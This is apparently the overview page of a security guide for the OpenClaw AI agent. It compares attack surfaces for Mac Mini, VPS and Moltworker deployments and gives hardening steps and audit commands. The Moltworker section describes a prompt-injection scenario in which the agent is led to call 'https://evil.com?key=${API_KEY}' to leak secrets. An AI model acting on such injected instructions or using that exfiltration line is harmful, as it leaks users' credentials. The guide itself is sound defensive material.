# Worst-Case Security Scenarios: Overview

## Who This Guide Is For

This guide is for anyone who wants to understand what could go wrong with OpenClaw if things are misconfigured or compromised. You don't need to be a security expert to follow along.

**Reading time:** 5 minutes for the overview, 10-15 minutes per deployment type

**What you'll learn:**
- What "attack surface" means in plain English
- The biggest risks for each deployment type
- How to tell if you're affected
- What to do if something goes wrong

---

## What Is "Attack Surface"?

> **In Plain English:** Your "attack surface" is like all the doors and windows in your house. The more doors you have, the more places a burglar could try to break in. In software, every feature that connects to the outside world is another "door" that needs to be secured.

OpenClaw has different "doors" depending on how you set it up:

| Deployment | The Analogy | Risk Level |
|------------|-------------|------------|
| **Mac Mini at home** | Few doors, mostly locked (private house) | 🟢 Lowest |
| **VPS in the cloud** | More doors, some face the internet (apartment) | 🟡 Medium |
| **Moltworker on Cloudflare** | Many doors, managed by someone else (hotel room) | 🟠 Highest complexity |

---

## Trust Boundary Diagram

```
┌─────────────────────────────────────────────────────────────┐
│                    YOUR TRUST BOUNDARY                       │
│  ┌─────────────┐  ┌─────────────┐  ┌─────────────────────┐  │
│  │  Mac Mini   │  │    VPS      │  │     Moltworker      │  │
│  │             │  │             │  │                     │  │
│  │ You control │  │ You control │  │ Cloudflare controls │  │
│  │ everything  │  │ the server  │  │ the infrastructure  │  │
│  │             │  │ (not the    │  │ (you control the    │  │
│  │             │  │  hardware)  │  │  code + secrets)    │  │
│  └─────────────┘  └─────────────┘  └─────────────────────┘  │
│        ▲                 ▲                    ▲              │
│   Most Private      Shared Infra       Least Control        │
└─────────────────────────────────────────────────────────────┘
```

**What this means:**
- **Mac Mini:** If something goes wrong, you can unplug the network cable and investigate locally
- **VPS:** If something goes wrong, you can destroy the server and rebuild, but you're trusting the hosting provider
- **Moltworker:** If something goes wrong at Cloudflare's level, you have no local fallback

---

## Attack Surface Comparison Table

| What Could Be Attacked | Mac Mini | VPS | Moltworker |
|------------------------|----------|-----|------------|
| **Network doors** (who can connect) | 🟢 Low - only you | 🟠 Medium - internet-facing | 🔴 High - edge everywhere |
| **Your passwords/keys** (where stored) | 🟢 Your disk | 🟠 Remote disk | 🔴 Cloudflare's systems |
| **Running commands** (who controls) | 🟢 You decide | 🟢 You decide | 🟠 Cloudflare sandbox |
| **AI trickery** (prompt injection) | 🟡 Your model | 🟡 Your model | 🟠 Goes through AI Gateway |
| **Physical access** | 🟠 Your home security | 🟢 Datacenter security | 🟢 No physical component |

---

## Quick Decision Guide

### Choose Mac Mini if:
- Privacy is your #1 priority
- You're comfortable with basic Mac administration
- You want full control over your data
- You're okay with the device needing to be on
- You want the ability to "pull the plug" in an emergency

### Choose VPS if:
- You need 24/7 availability without a home server
- You're comfortable with Linux servers
- You can handle firewall configuration
- You want remote access without exposing your home network
- [DigitalOcean 1-Click](../03-deploy/isolated-vps.md#11-digitalocean-1-click-deploy) is available for automatic hardening

### Choose Moltworker if:
- You're experimenting or doing a proof-of-concept
- You don't want to manage infrastructure
- You're okay with Cloudflare having access to your data
- You understand the trade-offs (convenience vs. control)
- You're not handling sensitive personal data

---

## The Biggest Risk for Each Deployment

### 🔴 Mac Mini: Physical Access + Cloud Sync

> **The Scenario:** Someone accesses your Mac (physically or via cloud sync), reads `~/.openclaw/credentials/`, and now has ALL your API keys, bot tokens, and OAuth credentials.

**Why it matters:** Your credentials are stored in plain text, protected only by filesystem permissions. If someone can read those files, they can impersonate your bot everywhere.

**Quick fix:** Enable FileVault, use a separate macOS user, never cloud-sync `~/.openclaw/`.

### 🔴 VPS: Internet Exposure

> **The Scenario:** You configure `gateway.bind = "lan"` or forget to set an auth token. Anyone on the internet can find your gateway and take full control.

**Why it matters:** A VPS has a public IP address. Every open port is visible to the entire internet. Port scanners find exposed services within hours.

**Quick fix:** Always use `gateway.bind = "loopback"`, always set `gateway.auth.token`, use SSH tunnels or Tailscale for remote access.

### 🔴 Moltworker: No Egress Filtering + Cloud Breach

> **The Scenario:** A prompt injection attack tricks your agent into making a request to `https://evil.com?key=${API_KEY}`. Moltworker has no egress filtering, so the request succeeds.

**Why it matters:** You cannot control what outbound requests your Moltworker makes. If an attacker can influence the AI, they can exfiltrate your secrets.

**Quick fix:** Understand this is a fundamental trade-off of serverless. For sensitive use cases, use Mac Mini or VPS instead.

---

## Understanding Severity Levels

Throughout this guide, we use these severity indicators:

| Level | Icon | Meaning | Action Required |
|-------|------|---------|-----------------|
| **CRITICAL** | 🔴 | Immediate action required, severe damage possible | Fix now, before doing anything else |
| **HIGH** | 🟠 | Significant risk, should address soon | Fix within days |
| **MEDIUM** | 🟡 | Moderate risk, good to fix | Fix when convenient |
| **LOW** | 🟢 | Minor issue, fix when convenient | Nice to have |

---

## How to Use This Guide

1. **Read this overview** to understand the landscape
2. **Read your deployment type's page** for specific risks:
   - [Mac Mini Risks](./mac-mini-risks.md)
   - [VPS Risks](./vps-risks.md)
   - [Moltworker Risks](./moltworker-risks.md)
3. **Read Cross-Cutting Vulnerabilities** for risks that affect everyone:
   - [Cross-Cutting Vulnerabilities](./cross-cutting.md)
4. **Read ClawHub Marketplace Risks** for skills/plugin supply chain threats:
   - [ClawHub Marketplace Risks](./clawhub-marketplace-risks.md)
   - [Skills.sh Risks](./skills-sh-risks.md)
5. **Check the Misconfiguration Examples** to see if you've made common mistakes:
   - [Misconfiguration Hall of Shame](./misconfiguration-examples.md)
6. **Read the AI Self-Misconfiguration guide** if you use AI to manage your config:
   - [AI Self-Misconfiguration](./ai-self-misconfiguration.md)
7. **Run the security audit** to verify your configuration:
   ```bash
   openclaw security audit --deep
   ```

---

## Quick Security Audit Checklist

Before diving into the detailed guides, check these basics:

```bash
# 1. Check gateway binding (should be "loopback" for most setups)
openclaw config get gateway.bind

# 2. Check auth mode (should be "token" or "password")
openclaw config get gateway.auth.mode

# 3. Check auth token is set (should show a long random string)
openclaw config get gateway.auth.token

# 4. Run full security audit
openclaw security audit --deep
```

If any of these fail, read the relevant deployment guide immediately.

---

## Code References

The security analysis in this guide is based on verified source code review:

| Component | Source File | Key Security Control |
|-----------|-------------|---------------------|
| Network binding | `src/gateway/net.ts:153-203` | Fallback chain with silent 0.0.0.0 fallback |
| Authentication | `src/gateway/auth.ts` | Token and password validation |
| File permissions | `src/config/io.ts:497,509` | 0o700 directories, 0o600 files |
| SSRF protection | `src/infra/net/ssrf.ts:253-305` | DNS pinning (Mac/VPS only) |
| Shell execution | `src/agents/bash-tools.exec.ts` | Allowlist and human approval |
| Security audit | `src/security/audit.ts:323-343` | Critical flag detection |

---

## Next Steps

Choose your deployment type and continue to the detailed guide:

- **[Mac Mini Risks](./mac-mini-risks.md)** - Physical access, cloud sync, network misconfiguration
- **[VPS Risks](./vps-risks.md)** - Internet exposure, multi-tenant risks, credential storage
- **[Moltworker Risks](./moltworker-risks.md)** - Trust boundaries, egress filtering, R2 storage
- **[Cross-Cutting Vulnerabilities](./cross-cutting.md)** - Prompt injection, tool execution, credentials
- **[ClawHub Marketplace Risks](./clawhub-marketplace-risks.md)** - Skills marketplace supply chain attacks (Feb 2026 ClawHavoc campaign)
- **[Skills.sh Risks](./skills-sh-risks.md)** - Unverified third-party skill distribution
- **[AI Self-Misconfiguration](./ai-self-misconfiguration.md)** - When AI modifies its own security config
- **[Prompt Injection Attacks](./prompt-injection-attacks.md)** - 30 attack examples with data exfiltration
- **[Misconfiguration Examples](./misconfiguration-examples.md)** - Real mistakes and how to fix them
- **[Incident Response Playbook](./incident-response.md)** - What to do when things go wrong
